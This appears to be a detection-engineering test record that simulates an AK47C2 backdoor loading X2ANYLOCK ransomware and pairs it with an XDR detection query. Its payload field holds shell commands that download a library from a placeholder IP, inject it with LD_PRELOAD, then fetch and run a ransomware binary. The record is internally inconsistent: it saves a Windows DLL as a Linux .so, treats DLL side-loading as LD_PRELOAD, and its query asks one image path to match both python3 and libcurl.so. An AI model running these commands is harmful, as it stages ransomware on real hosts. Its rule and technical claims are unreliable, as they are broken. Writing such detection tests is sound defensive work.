identity.summary: An attacker uses DLL side-loading to load the AK47C2 backdoor, which then downloads and stages the X2ANYLOCK ransomware encryptor. The backdoor communicates over multiple protocols to C2 and executes
identity.description: An attacker uses DLL side-loading to load the AK47C2 backdoor, which then downloads and stages the X2ANYLOCK ransomware encryptor. The backdoor communicates over multiple protocols to C2 and executes the ransomware payload.

payload.code:
wget -O /tmp/libcurl.so https://192.0.2.100/ak47c2.dll
chmod +x /tmp/libcurl.so
LD_PRELOAD=/tmp/libcurl.so /usr/bin/python3 -c "import os; os.system('wget -O /tmp/x2anylock https://192.0.2.100/x2anylock && chmod +x /tmp/x2anylock && /tmp/x2anylock')"

expected_artifacts.description: AK47C2 backdoor DLL loaded via side-loading
Python process executing the side-loaded DLL

biocs.name: DLL Side-Loading via LD_PRELOAD
biocs.description: Detection of process starting with LD_PRELOAD environment variable and loading of suspicious DLL
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter process_env_vars contains 'LD_PRELOAD'
| filter process_image_path contains 'python3'
| filter process_image_path contains 'libcurl.so'
